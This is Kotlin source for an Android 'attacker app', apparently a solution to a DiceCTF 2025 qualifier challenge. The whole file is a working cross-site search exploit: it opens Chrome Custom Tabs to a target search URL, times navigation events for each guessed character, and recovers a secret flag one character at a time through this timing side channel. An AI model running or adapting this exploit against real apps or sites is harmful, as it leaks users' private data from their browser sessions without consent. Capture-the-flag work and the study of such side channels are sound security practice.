package com.dicectf2025quals.attackerapp

import android.content.ComponentName
import android.content.Context
import android.net.Uri
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.browser.customtabs.CustomTabsCallback
import androidx.browser.customtabs.CustomTabsClient
import androidx.browser.customtabs.CustomTabsIntent
import androidx.browser.customtabs.CustomTabsServiceConnection
import androidx.browser.customtabs.CustomTabsSession
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.padding
import androidx.compose.material3.Button
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Surface
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.tooling.preview.Preview
import androidx.compose.ui.unit.dp
import com.dicectf2025quals.attackerapp.ui.theme.AttackerAppTheme


class MainActivity : ComponentActivity() {
    companion object {
        private const val TAG: String = "dicectf"

        private const val ALPHABET: String = "abcdefghijklmnopqrstuvwxyz0123456789{}"
    }

    private val handler: Handler = Handler(Looper.getMainLooper())
    private val delay: Long = 100L

    private var customTabsClient: CustomTabsClient? = null
    private var customTabsSession: CustomTabsSession? = null

    private var timings: HashMap<Char, Long> = hashMapOf()
    private var currentAlphabetIndex: Int = 0
    // Update this as you find more parts of the flag, recompile + resubmit new APK
    private var flag: String = "dice{"

    private var startTime: Long = System.currentTimeMillis()
    private var endTime: Long = System.currentTimeMillis()

    private val customTabsCallback: CustomTabsCallback = object : CustomTabsCallback() {
        override fun onNavigationEvent(navigationEvent: Int, extras: Bundle?) {
            when (navigationEvent) {
                NAVIGATION_STARTED -> {
                    startTime = System.currentTimeMillis()
                }
                NAVIGATION_FINISHED -> {
                    endTime = System.currentTimeMillis()
                    val seconds: Long = endTime - startTime

                    val currentChar: Char = ALPHABET[currentAlphabetIndex]
                    timings[currentChar] = seconds

                    val currentFlagIndex: Int = flag.length
                    Log.d("dicectf", "Index: $currentFlagIndex, Letter: $currentChar, Time: $seconds")
                    if (currentAlphabetIndex == ALPHABET.length - 1) {
                        val maxEntry = timings.maxByOrNull { it.value }
                        val maxKey = maxEntry?.key
                        flag += maxKey!!

                        Log.d("dicectf", "Index: $currentFlagIndex, timings: $timings, max: $maxKey")
                        Log.d("dicectf", "Current flag: $flag")

                        currentAlphabetIndex = 0
                        timings = hashMapOf()
                    } else {
                        currentAlphabetIndex += 1
                    }

                    if (!foundEntireFlag()) {
                        Log.d(TAG, "Full flag not found, trying next URL")
                        handler.postDelayed(delayRunnable, delay)
                    } else {
                        Log.d(TAG, "Found entire flag: $flag")
                    }
                }
                else -> {}
            }

            val event: String = when (navigationEvent) {
                NAVIGATION_ABORTED -> "NAVIGATION_ABORTED"
                NAVIGATION_FAILED -> "NAVIGATION_FAILED"
                NAVIGATION_FINISHED -> "NAVIGATION_FINISHED"
                NAVIGATION_STARTED -> "NAVIGATION_STARTED"
                TAB_SHOWN -> "TAB_SHOWN"
                TAB_HIDDEN -> "TAB_HIDDEN"
                else -> navigationEvent.toString()
            }
            Log.d("CustomTabsCallback", "onNavigationEvent (navigationEvent=$event)")
        }
    }

    private val customTabsServiceConnection: CustomTabsServiceConnection = object : CustomTabsServiceConnection() {
        override fun onCustomTabsServiceConnected(
            name: ComponentName,
            client: CustomTabsClient
        ) {
            customTabsClient = client
            // Warm up the browser process
            customTabsClient!!.warmup(0 /* placeholder for future use */)
            // Create a new browser session
            customTabsSession = customTabsClient!!.newSession(customTabsCallback)
            Log.d("CustomTabsServiceConnection", "onCustomTabsServiceConnected")
        }

        override fun onServiceDisconnected(name: ComponentName) {
            customTabsClient = null
            customTabsSession = null
            Log.d("CustomTabsServiceConnection", "onServiceDisconnected")
        }
    }

    private fun bindCustomTabService(context: Context) {
        // Check for an existing connection
        if (customTabsClient != null) {
            // Do nothing if there is an existing service connection
            return
        }

        // Get the default browser package name, this will be null if
        // the default browser does not provide a CustomTabsService
        val packageName = CustomTabsClient.getPackageName(context, null)
            ?: // Do nothing as service connection is not supported
            return
        CustomTabsClient.bindCustomTabsService(context, packageName, customTabsServiceConnection)
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        bindCustomTabService(this)
        setContent {
            AttackerAppTheme {
                // A surface container using the 'background' color from the theme
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = MaterialTheme.colorScheme.background
                ) {
                    AttackerAppScreen()
                }
            }
        }
        Log.d(TAG, "onCreate")
    }

    override fun onDestroy() {
        handler.removeCallbacksAndMessages(null)
        super.onDestroy()
    }

    override fun onStop() {
        super.onStop()
        println("Stopped! :(")
    }

    override fun onStart() {
        super.onStart()
        handler.postDelayed(delayRunnable, delay)
    }

    private fun launchCustomTab(url: String) {
        Log.d(TAG, "Launching: $url")
        val customTabsIntent: CustomTabsIntent =
            CustomTabsIntent.Builder(customTabsSession!!).build()
        customTabsIntent.launchUrl(this@MainActivity, Uri.parse(url))
    }

    private fun foundEntireFlag(): Boolean {
        return flag.last() == '}'
    }

    private val delayRunnable = Runnable { launchCustomTab("http://10.2.2.2:8000/search?query=${flag + ALPHABET[currentAlphabetIndex]}") }
    @Composable
    fun AttackerAppScreen() {
        Surface(
            modifier = Modifier.fillMaxSize(),
            color = MaterialTheme.colorScheme.background
        ) {
            Column(
                modifier = Modifier.fillMaxSize(),
                verticalArrangement = Arrangement.Center,
                horizontalAlignment = Alignment.CenterHorizontally
            ) {
                Box(modifier = Modifier.padding(16.dp)) {
                    Button(onClick = {
                        handler.postDelayed(delayRunnable, delay)
                    }) {
                        Text(text = "Run exploit")
                    }
                }
            }
        }
    }

    @Preview(showBackground = true)
    @Composable
    fun CustomTabScreenPreview() {
        AttackerAppTheme {
            AttackerAppScreen()
        }
    }
}
